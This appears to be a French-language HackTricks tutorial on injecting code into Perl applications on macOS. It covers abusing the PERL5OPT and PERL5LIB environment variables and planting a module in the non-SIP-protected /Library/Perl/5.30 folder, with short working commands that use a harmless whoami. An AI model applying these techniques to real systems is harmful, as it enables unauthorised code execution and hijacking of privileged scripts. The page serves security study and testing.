# Injection d'applications Perl sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via la variable d'environnement `PERL5OPT` & `PERL5LIB`

En utilisant la variable d'environnement PERL5OPT, il est possible de faire exécuter des commandes arbitraires par perl.\
Par exemple, créez ce script :
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Maintenant, **exportez la variable d'environnement** et exécutez le script **perl** :
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Une autre option est de créer un module Perl (par exemple, `/tmp/pmod.pm`) :
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Et ensuite utilisez les variables d'environnement :
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Via dependencies

Il est possible de lister l'ordre du dossier des dépendances de Perl en cours d'exécution :
```bash
perl -e 'print join("\n", @INC)'
```
Ce qui renverra quelque chose comme :
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Certaines des dossiers retournés n'existent même pas, cependant, **`/Library/Perl/5.30`** **existe**, il n'est **pas** **protégé** par **SIP** et il est **avant** les dossiers **protégés par SIP**. Par conséquent, quelqu'un pourrait abuser de ce dossier pour y ajouter des dépendances de script afin qu'un script Perl à privilèges élevés le charge.

> [!WARNING]
> Cependant, notez que vous **devez être root pour écrire dans ce dossier** et de nos jours, vous obtiendrez cette **invite TCC** :

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Par exemple, si un script importe **`use File::Basename;`**, il serait possible de créer `/Library/Perl/5.30/File/Basename.pm` pour exécuter du code arbitraire.

## Références

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
